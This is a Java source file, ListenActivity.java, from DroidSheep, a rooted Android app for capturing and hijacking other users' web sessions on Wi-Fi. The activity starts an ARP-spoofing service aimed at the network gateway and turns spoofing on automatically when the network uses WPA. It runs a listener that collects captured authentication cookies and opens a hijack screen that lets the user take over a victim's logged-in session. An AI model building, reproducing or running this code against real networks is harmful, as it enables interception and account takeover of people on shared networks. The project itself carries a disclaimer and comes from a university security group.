/*
 * ListenActivity.java is the starting Activity, listening for cookies Copyright
 * (C) 2011 Andreas Koch <koch.trier@gmail.com>
 * 
 * This software was supported by the University of Trier
 * 
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 3 of the License, or (at your option) any later
 * version.
 * 
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * 
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package de.trier.infsec.koch.droidsheep.activities;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Hashtable;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.AlertDialog;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiConfiguration.Status;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.format.Formatter;
import android.util.Log;
import android.view.ContextMenu;
import android.view.ContextMenu.ContextMenuInfo;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.View.OnCreateContextMenuListener;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import de.trier.infsec.koch.droidsheep.R;
import de.trier.infsec.koch.droidsheep.arpspoof.ArpspoofService;
import de.trier.infsec.koch.droidsheep.arpspoof.RootAccess;
import de.trier.infsec.koch.droidsheep.auth.Auth;
import de.trier.infsec.koch.droidsheep.auth.AuthHelper;
import de.trier.infsec.koch.droidsheep.helper.DBHelper;
import de.trier.infsec.koch.droidsheep.helper.SetupHelper;
import de.trier.infsec.koch.droidsheep.helper.SystemHelper;
import de.trier.infsec.koch.droidsheep.objects.SessionListView;
import de.trier.infsec.koch.droidsheep.objects.WifiChangeChecker;
import de.trier.infsec.koch.droidsheep.thread.ListenThread;

public class ListenActivity extends Activity implements OnClickListener, OnItemClickListener, OnCreateContextMenuListener {

	public static Hashtable<String, Auth> authList = new Hashtable<String, Auth>();
	public static boolean disclaimerAccepted = false;

	private SessionListView sessionListView;
	private TextView tstatus;
	private TextView tnetworkConnected;
	private TextView tnetworkName;
	private TextView tnetworkEncryption;
	private ProgressBar pbrunning;

	private int sessionListViewSelected;
	private String sessionListViewSelectedKey;

	private boolean networkConnected = false;
	private boolean networkEncryptionWPA = false;
	private String networkName = "";

	public static final String BUNDLE_KEY_TYPE = "TYPE";
	public static final String BUNDLE_TYPE_WIFICHANGE = "WIFICHANGE";
	public static final String BUNDLE_TYPE_NEWAUTH = "NEWAUTH";
	public static final String BUNDLE_KEY_ID = "ID";
	public static final String BUNDLE_KEY_MOBILE = "MOBILE";
	public static final String BUNDLE_KEY_AUTH = "AUTH";
	public static final String BUNDLE_KEY_NOROOT = "NOROOT";

	public static final String APPLICATION_TAG = "DROIDSHEEP";

	public static final int MENU_WIFILIST_ID = 0;
	public static final int MENU_CLEAR_SESSIONLIST_ID = 1;
	public static final int MENU_EXIT_ID = 2;
	public static final int MENU_GENERIC = 3;
	public static final int MENU_CLEAR_BLACKLIST_ID = 4;

	private static final int NOTIFICATION_ID = 4711;
	public static boolean unrooted = false;

	private int lastNotification = 0;
	private NotificationManager mNotificationManager = null;
	
	public static boolean generic = true;

	private Handler handler = new Handler() {
		@Override
		public synchronized void handleMessage(Message msg) {
			String type = msg.getData().getString(BUNDLE_KEY_TYPE);
			if (type != null && type.equals(BUNDLE_TYPE_WIFICHANGE)) {
				if (!ListenThread.running)
					return;
				Toast t = Toast.makeText(getApplicationContext(), getString(R.string.toast_wifi_lost), Toast.LENGTH_SHORT);
				t.show();
				stop();
				cleanup();
				updateNetworkSettings();
			} else if (type != null && type.equals(BUNDLE_TYPE_NEWAUTH)) {
				ListenActivity.this.refresh();
				ListenActivity.this.notifyUser();
			}
		};
	};

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		if (!RootAccess.isGranted()) {
			unrooted = true;
		} else {
			SetupHelper.checkPrerequisites(this.getApplicationContext());
			AuthHelper.init(this.getApplicationContext());
			WifiChangeChecker wi = new WifiChangeChecker(handler);
			this.getApplicationContext().registerReceiver(wi, new IntentFilter(WifiManager.WIFI_STATE_CHANGED_ACTION));
		}
	}

	@Override
	protected void onStart() {
		super.onStart();
		if (unrooted) {
			showUnrooted();
			return;
		}
		setContentView(R.layout.listen);
		Button button = (Button) findViewById(R.id.bstartstop);
		Button buttonSpoof = (Button) findViewById(R.id.bspoof);

		button.setOnClickListener(this);
		buttonSpoof.setOnClickListener(this);
		if (ListenThread.running) {
			button.setText(getString(R.string.button_stop));
		} else {
			button.setText(getString(R.string.button_start));
		}
		tstatus = (TextView) findViewById(R.id.status);
		tnetworkConnected = (TextView) findViewById(R.id.networkconnected);
		tnetworkEncryption = (TextView) findViewById(R.id.hasWPA);
		tnetworkName = (TextView) findViewById(R.id.networkname);
		pbrunning = (ProgressBar) findViewById(R.id.progressBar1);

		this.sessionListView = ((SessionListView) findViewById(R.id.sessionlist));
		this.sessionListView.setOnItemClickListener(this);
		this.sessionListView.setOnCreateContextMenuListener(this);

		mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
		ListenActivity.generic = DBHelper.getGeneric(this);
		showDisclaimer();
	}

	private void showDisclaimer() {
		if (disclaimerAccepted)
			return;

		LayoutInflater inflater = (LayoutInflater) getApplicationContext().getSystemService(LAYOUT_INFLATER_SERVICE);
		final View layout = inflater.inflate(R.layout.disclaimer, (ViewGroup) findViewById(R.id.layout_root));

		AlertDialog al = new AlertDialog(this) {
			@Override
			public boolean onSearchRequested() {
				return false;
			}
		};
		al.setView(layout);
		al.setButton("OK", new DialogInterface.OnClickListener() {
			@Override
			public void onClick(DialogInterface dialog, int which) {
				CheckBox cb = (CheckBox) layout.findViewById(R.id.lic_ack);
				if (!cb.isChecked()) {
					Toast t = Toast.makeText(ListenActivity.this, getString(R.string.accept_text), Toast.LENGTH_SHORT);
					t.show();
					showDisclaimer();
				} else {
					disclaimerAccepted = true;
				}
			}
		});
		al.setCancelable(false);
		al.show();
	}

	private void showUnrooted() {
		LayoutInflater inflater = (LayoutInflater) getApplicationContext().getSystemService(LAYOUT_INFLATER_SERVICE);
		final View layout = inflater.inflate(R.layout.unrooted, (ViewGroup) findViewById(R.id.layout_root));

		AlertDialog al = new AlertDialog(this) {
			@Override
			public boolean onSearchRequested() {
				return false;
			}
		};
		al.setView(layout);
		al.setButton("OK", new DialogInterface.OnClickListener() {
			@Override
			public void onClick(DialogInterface dialog, int which) {
				finish();
			}
		});
		al.setCancelable(false);
		al.show();
	}

	//	public void getUserInfo(Auth auth) {
	//	    // Create a new HttpClient and Post Header
	//	    HttpClient httpclient = new DefaultHttpClient();
	//	    HttpPost httppost = new HttpPost(auth.getUrl());
	//	    
	//	    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
	//	    for (CookieWrapper c : auth.getCookies()) {
	//	    	nameValuePairs.add(new BasicNameValuePair(c.getCookie().getName(), c.getCookie().getValue()));
	//	    }
	//	    
	//	    try {
	//			httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
	//			HttpResponse response = httpclient.execute(httppost);
	//			int i = 0;
	//		} catch (IOException e) {
	//			e.printStackTrace();
	//		}
	//	}

	@Override
	protected void onResume() {
		super.onResume();
		if (unrooted)
			return;
		refresh();
		mNotificationManager.cancelAll();
	}

	@Override
	protected void onDestroy() {
		try {
			cleanup();
		} catch (Exception e) {
			Log.e(ListenActivity.APPLICATION_TAG, "Error while onDestroy", e);
		}
		super.onDestroy();
	}

	@Override
	public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
		sessionListViewSelected = position;
		sessionListViewSelectedKey = (String) authList.keySet().toArray()[position];
		sessionListView.showContextMenuForChild(view);
	}
	

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		switch (item.getItemId()) {
		case MENU_WIFILIST_ID:
			startActivity(new Intent(WifiManager.ACTION_PICK_WIFI_NETWORK));
			break;
		case MENU_CLEAR_SESSIONLIST_ID:
			authList.clear();
			refresh();
			mNotificationManager.cancelAll();
			break;
		case MENU_EXIT_ID:
			authList.clear();
			mNotificationManager.cancelAll();
			finish();
			break;
		case MENU_GENERIC:
			generic = !generic;
			DBHelper.setGeneric(this, generic);
			break;
		case MENU_CLEAR_BLACKLIST_ID:
			clearBlacklist();
			break;
		}
		return false;
	}

	@Override
	public boolean onContextItemSelected(MenuItem item) {
		switch (item.getItemId()) {
		case SessionListView.ID_MOBILE:
			click(sessionListViewSelected, true);
			break;
		case SessionListView.ID_NORMAL:
			click(sessionListViewSelected, false);
			break;
		case SessionListView.ID_DELETE:
			authList.remove(authList.keySet().toArray(new String[] {})[sessionListViewSelected]);
			refresh();
			break;
		case SessionListView.ID_BLACKLIST:
			Auth a = authList.get(authList.keySet().toArray(new String[] {})[sessionListViewSelected]);
			AuthHelper.addToBlackList(this, a.getName());
			authList.remove(a.getId());
			refresh();
		break;
		}
		return true;
	}

	@Override
	public void onClick(View v) {
		if (v.getId() == R.id.bstartstop && !ListenThread.running) {
			start();
		} else if (v.getId() == R.id.bstartstop && ListenThread.running) {
			stop();
		} else if (v.getId() == R.id.bspoof) {
			if (isSpoofing()) {
				stopSpoofing();
			} else {
				startSpoofing();
			}
		}
		refresh();
	}

	private void startSpoofing() {
		WifiManager wManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
		WifiInfo wInfo = wManager.getConnectionInfo();

		//Check to see if we're connected to wifi
		int localhost = wInfo.getIpAddress();
		if (localhost != 0) {
			String gatewayIP = Formatter.formatIpAddress(wManager.getDhcpInfo().gateway);
			String localhostIP = Formatter.formatIpAddress(localhost);
			//If nothing was entered for the ip address use the gateway
			if (gatewayIP.trim().equals(""))
				gatewayIP = Formatter.formatIpAddress(wManager.getDhcpInfo().gateway);

			//determining wifi network interface
			InetAddress localInet;
			String interfaceName = null;
			try {
				localInet = InetAddress.getByName(localhostIP);
				NetworkInterface wifiInterface = NetworkInterface.getByInetAddress(localInet);
				interfaceName = wifiInterface.getDisplayName();
			} catch (UnknownHostException e) {
				Log.e(ListenActivity.APPLICATION_TAG, "error getting localhost's InetAddress", e);
			} catch (SocketException e) {
				Log.e(ListenActivity.APPLICATION_TAG, "error getting wifi network interface", e);
			}

			Intent intent = new Intent(this, ArpspoofService.class);
			Bundle mBundle = new Bundle();
			mBundle.putString("gateway", gatewayIP);
			mBundle.putString("localBin", SystemHelper.getARPSpoofBinaryPath(this));
			mBundle.putString("interface", interfaceName);
			intent.putExtras(mBundle);

			startService(intent);
		} else {
			CharSequence text = "Must be connected to wireless network.";
			Toast.makeText(getApplicationContext(), text, Toast.LENGTH_LONG).show();
		}
	}

	public void stopSpoofing() {
		Intent intent = new Intent(this, ArpspoofService.class);
		stopService(intent);
		try {
			Thread.sleep(500);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	private boolean isSpoofing() {
		ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
		for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
			if ("de.trier.infsec.koch.droidsheep.arpspoof.ArpspoofService".equals(service.service.getClassName())) {
				return true;
			}
		}
		return false;
	}

	@Override
	public void onCreateContextMenu(ContextMenu menu, View v, ContextMenuInfo menuInfo) {
		if (authList.get(sessionListViewSelectedKey) == null) {
			return;
		}
		menu.setHeaderTitle(getString(R.string.menu_choose_page_title));
		menu.add(ContextMenu.NONE, SessionListView.ID_NORMAL, ContextMenu.NONE, getString(R.string.menu_open_normal));
		menu.add(ContextMenu.NONE, SessionListView.ID_DELETE, ContextMenu.NONE, getString(R.string.menu_remove_from_list));
		menu.add(ContextMenu.NONE, SessionListView.ID_BLACKLIST, ContextMenu.NONE, getString(R.string.menu_black_list));
		if (authList.get(sessionListViewSelectedKey).getMobileUrl() != null) {
			menu.add(ContextMenu.NONE, SessionListView.ID_MOBILE, ContextMenu.NONE, getString(R.string.menu_open_mobile));
		}
	}

	@Override
	public boolean onPrepareOptionsMenu(Menu menu) {
		super.onCreateOptionsMenu(menu);
		menu.clear();
		menu.add(0, MENU_WIFILIST_ID, 0, getString(R.string.menu_wifilist));
		menu.add(0, MENU_CLEAR_SESSIONLIST_ID, 0, getString(R.string.menu_clear_sessionlist));
		if (ListenActivity.generic) {			
			menu.add(0, MENU_GENERIC, 0, getString(R.string.menu_disable_generic));
		} else {
			menu.add(0, MENU_GENERIC, 0, getString(R.string.menu_enable_generic));
		}
		menu.add(0, MENU_CLEAR_BLACKLIST_ID, 0, getString(R.string.menu_blacklist_clear));
		menu.add(0, MENU_EXIT_ID, 0, getString(R.string.menu_exit));
		return true;
	}

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if (keyCode == KeyEvent.KEYCODE_BACK) {
			return true;
		}
		return super.onKeyDown(keyCode, event);
	}

	public void click(int id, boolean mobilePage) {
		if (authList.isEmpty()) {
			Toast.makeText(this.getApplicationContext(), "No Auth available...", Toast.LENGTH_SHORT).show();
			return;
		}
		String key = (String) authList.keySet().toArray()[id];

		Bundle b = new Bundle();
		b.putString(BUNDLE_KEY_ID, key);
		b.putBoolean(BUNDLE_KEY_MOBILE, mobilePage);

		Intent intent = new Intent(ListenActivity.this, HijackActivity.class);
		intent.putExtras(b);
		startActivity(intent);
	}

	private void start() {
		updateNetworkSettings();
		if (!networkConnected) {
			Toast.makeText(this.getApplicationContext(), "You are not connected to any network!", Toast.LENGTH_LONG).show();
			return;
		}

		if (networkEncryptionWPA && !isSpoofing()) {
			Toast.makeText(this.getApplicationContext(),
					"This network is WPA encrypted. ARP-Spoofing will be automaticalle enabled!", Toast.LENGTH_LONG).show();
			startSpoofing();
		}

		Button bstartstop = (Button) findViewById(R.id.bstartstop);

		if (!ListenThread.running) {
			ListenThread.reset();
			Thread t = ListenThread.getInstance(this.getApplicationContext(), handler);
			t.start();
			bstartstop.setText("Stop");
		} else {
			Toast t = Toast.makeText(this.getApplicationContext(), getString(R.string.toast_process_running_text),
					Toast.LENGTH_SHORT);
			t.show();
		}
		try {
			Thread.sleep(100);
		} catch (InterruptedException e) {
		}

		refresh();
	}

	private void stop() {
		ListenThread.running = false;
		ListenThread.cleanUp();

		Button bstartstop = ((Button) findViewById(R.id.bstartstop));
		bstartstop.setText("Start");
		stopSpoofing();
		refresh();
	}

	private void cleanup() {
		tstatus.setText(getString(R.string.label_not_running));
		tstatus.setTextColor(Color.YELLOW);
		pbrunning.setVisibility(ProgressBar.INVISIBLE);
		Button button = ((Button) findViewById(R.id.bstartstop));
		button.setText("Start");
		ListenThread.cleanUp();
	}

	private void refresh() {
		if (ListenThread.running && ListenThread.getInstance(this.getApplicationContext(), handler).isAlive() && !isSpoofing()) {
			tstatus.setText(getString(R.string.label_running));
			tstatus.setTextColor(Color.GREEN);
			tstatus.setTextSize(15);
			pbrunning.setVisibility(ProgressBar.VISIBLE);
		} else if (ListenThread.running && ListenThread.getInstance(this.getApplicationContext(), handler).isAlive()
				&& isSpoofing()) {
			tstatus.setText(getString(R.string.label_running_and_spoofing));
			tstatus.setTextColor(Color.GREEN);
			tstatus.setTextSize(15);
			pbrunning.setVisibility(ProgressBar.VISIBLE);
		} else if (!(ListenThread.running && ListenThread.getInstance(this.getApplicationContext(), handler).isAlive())
				&& isSpoofing()) {
			tstatus.setText(getString(R.string.label_not_running_and_spoofing));
			tstatus.setTextColor(Color.YELLOW);
			tstatus.setTextSize(15);
			pbrunning.setVisibility(ProgressBar.INVISIBLE);
		} else {
			tstatus.setText(getString(R.string.label_not_running));
			tstatus.setTextColor(Color.YELLOW);
			tstatus.setTextSize(15);
			pbrunning.setVisibility(ProgressBar.INVISIBLE);
		}

		Button buttonSpoof = (Button) findViewById(R.id.bspoof);
		if (isSpoofing()) {
			buttonSpoof.setText("stop ARP spoofing");
		} else {
			buttonSpoof.setText("start ARP spoofing");
		}
		updateNetworkSettings();
		sessionListView.refresh();
	}

	private void updateNetworkSettings() {
		WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
		if (!(wm.getWifiState() == WifiManager.WIFI_STATE_ENABLED)) {
			networkConnected = false;
			networkEncryptionWPA = false;

			networkName = "- None -";
			tnetworkName.setText(getString(R.string.label_networkname_pref) + networkName.toUpperCase());

			tnetworkConnected.setText(getString(R.string.label_status_disconnected));
			tnetworkConnected.setTextColor(Color.RED);

			tnetworkEncryption.setText("");
		}

		for (WifiConfiguration wc : wm.getConfiguredNetworks()) {
			if (!(wc.status == Status.CURRENT))
				continue;
			networkConnected = true;
			tnetworkConnected.setText(getString(R.string.label_status_connected));
			tnetworkConnected.setTextColor(Color.GREEN);

			networkName = wc.SSID;
			tnetworkName.setText(getString(R.string.label_networkname_pref) + networkName.toUpperCase());

			if (wc.preSharedKey != null) {
				networkEncryptionWPA = true;
				tnetworkEncryption.setText(getString(R.string.label_wpa_network));
				tnetworkEncryption.setTextColor(Color.RED);
			} else {
				networkEncryptionWPA = false;
				if (wc.wepKeys[0] != null) {
					tnetworkEncryption.setText(getString(R.string.label_wep_network));
					tnetworkEncryption.setTextColor(Color.YELLOW);
				} else {
					tnetworkEncryption.setText(getString(R.string.label_open_network));
					tnetworkEncryption.setTextColor(Color.GREEN);
				}
			}
		}
	}

	private void notifyUser() {
		if (lastNotification >= authList.size())
			return;
		lastNotification = authList.size();

		int icon = R.drawable.droidsheep_square;
		long when = System.currentTimeMillis();
		Notification notification = new Notification(icon, getString(R.string.notification_title), when);

		Context context = getApplicationContext();
		Intent notificationIntent = new Intent(ListenActivity.this, ListenActivity.class);
		PendingIntent contentIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);

		notification.setLatestEventInfo(context, getString(R.string.notification_title), getString(R.string.notification_text),
				contentIntent);
		mNotificationManager.notify(NOTIFICATION_ID, notification);
	}
	
	public void clearBlacklist() {
		AlertDialog.Builder builder = new AlertDialog.Builder(this);
		builder.setMessage(R.string.clear_blacklist).setCancelable(false)
				.setPositiveButton(R.string.clear_blacklist_ok, new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog, int id) {
						DBHelper.clearBlacklist(ListenActivity.this);
						AuthHelper.clearBlacklist();
					}
				}).setNegativeButton(R.string.clear_blacklist_abprt, new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog, int id) {
						dialog.cancel();
					}
				});
		AlertDialog alert = builder.create();
		alert.show();
	}

}